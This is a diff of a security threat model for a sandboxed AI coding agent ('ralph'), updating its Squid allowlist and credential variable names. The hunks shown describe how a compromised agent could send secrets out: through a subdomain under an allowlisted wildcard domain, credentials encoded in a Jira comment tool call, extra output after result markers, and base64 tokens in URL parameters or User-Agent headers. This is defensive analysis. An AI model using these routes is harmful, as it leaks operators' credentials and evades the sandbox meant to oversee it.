@@ -8,7 +8,7 @@
 >
 > Several findings below reference a **stale Squid allowlist** and **incorrect sidecar network topology**:
 >
-> - **Squid domains changed.** `.dev.azure.com`, `.githubusercontent.com`, `.atlassian.com`, `.atlassian.net`, `.visualstudio.com`, `.blob.core.windows.net`, `.kentico.com`, `.microsoft.com`, `.xperience.io` have been **removed** from `squid.conf`. The current allowlist is: `.githubcopilot.com`, `api.github.com`, `github.com`, `.anthropic.com`, `aka.ms`, `.npmjs.org`, `.rubygems.org`, `.nuget.org`, `.pypi.org`, `.pythonhosted.org`. This significantly reduces H1's attack surface.
+> - **Squid domains changed.** `.dev.azure.com`, `.githubusercontent.com`, `.atlassian.com`, `.atlassian.net`, `.visualstudio.com`, `.blob.core.windows.net`, `.kentico.com`, `.microsoft.com`, `.xperience.io` have been **removed** from `squid.conf`. The shared baseline now allows only `.githubcopilot.com`, `api.github.com`, `github.com` and `.anthropic.com`; each profile adds its own `allowlistDomains`. The bundled profiles re-add some of the removed domains: `ralph-docs` allows `.aka.ms`, `.dev.azure.com`, `.artifacts.visualstudio.com`, `.blob.core.windows.net` and package registries; `ralph-vscode` allows `dev.azure.com`, `pkgs.dev.azure.com`, `vsblob.dev.azure.com`, `.artifacts.visualstudio.com` and `.npmjs.org`. H1's wildcard-domain reasoning still applies to those entries (for example, any storage account under `.blob.core.windows.net`).
 > - **Sidecar has direct internet.** The MCP sidecar now connects to `ralph-sidecar-external` (bridge network with direct internet) and does **NOT** route through Squid. This makes H5's impact assessment **understated** — a compromised sidecar has unrestricted egress.
 > - **Playwright tools renamed.** `playwright_navigate`/`playwright_evaluate` (M12) are now `browser_navigate`/`browser_evaluate`.
 
@@ -44,7 +44,7 @@ The agent has **no direct internet route**. All egress goes through Squid, which
 
 An attacker can register `exfil.dev.azure.com` pointed at their server. Squid validates the Host header and allows the CONNECT tunnel. The agent POSTs data inside the HTTPS tunnel. Squid cannot inspect the encrypted payload.
 
-**Important scope constraint:** The sidecar credentials (JIRA_PAT, ADO_PAT, DISCORD_BOT_TOKEN) are NOT present in the agent container's environment — they live in the sidecar's `gateway.json` and process env only. This vector exfiltrates what the agent **already has direct access to**:
+**Important scope constraint:** The sidecar credentials (`JIRA_PAT_<KEY>`, `ADO_PAT`, `DISCORD_BOT_TOKEN`) are NOT present in the agent container's environment — they live in the sidecar's `gateway.json` and process env only. This vector exfiltrates what the agent **already has direct access to**:
 
 - `GH_TOKEN` and `ANTHROPIC_API_KEY` — injected directly into the agent container via `BASE_CONTAINER_ENV` in `compose-overlay.ts`
 - Full contents of the mounted target repository (`/workspace`)
@@ -86,7 +86,7 @@ No proxy rule can distinguish this from a legitimate GitHub API call. Works iden
 
 Credential flow:
 ```
-process.env.JIRA_PAT / ADO_PAT / DISCORD_BOT_TOKEN
+process.env.JIRA_PAT_KENTICO_JIRA / ADO_PAT / DISCORD_BOT_TOKEN
   → generateGatewayConfig()
   → profiles/<id>/.build/gateway.json  (plaintext on host)
   → mounted RO into sidecar container
@@ -104,7 +104,7 @@ The agent container and sidecar are on the same `ralph-internal` network with HT
 
 The agent calls a legitimate tool but embeds exfil data in the payload:
 ```
-jira_add_comment(issueKey="DOC-1", body="Audit complete. Ref: <encoded-JIRA_PAT>")
+jira_add_comment(issueKey="DOC-1", body="Audit complete. Ref: <encoded-JIRA_PAT_KENTICO_JIRA>")
 ```
 
 The JIRA MCP server (running in sidecar with the real credential) authenticates and posts the comment to JIRA. The attacker reads the JIRA comment. The same applies to ADO work item updates or Discord messages.
@@ -147,7 +147,7 @@ A compromised agent outputs:
 ===RALPH_RESULT_START===
 { "prUrl": "https://...", "status": "success" }
 ===RALPH_RESULT_END===
-JIRA_PAT=<value> ADO_PAT=<value>
+JIRA_PAT_KENTICO_JIRA=<value> ADO_PAT=<value>
 ```
 
 The extra content is written to the log file on the host. The attacker reads it post-task via direct filesystem access, JIRA revision history, or any other mechanism that touches the output directory.
@@ -162,7 +162,7 @@ The extra content is written to the log file on the host. The attacker reads it 
 
 The agent encodes credentials in URL parameters or User-Agent strings that Squid records:
 ```
-GET https://api.github.com/?ref=<base64-JIRA_PAT> HTTP/1.1
+GET https://api.github.com/?ref=<base64-JIRA_PAT_KENTICO_JIRA> HTTP/1.1
 User-Agent: <encoded-ADO_PAT>
 ```
 
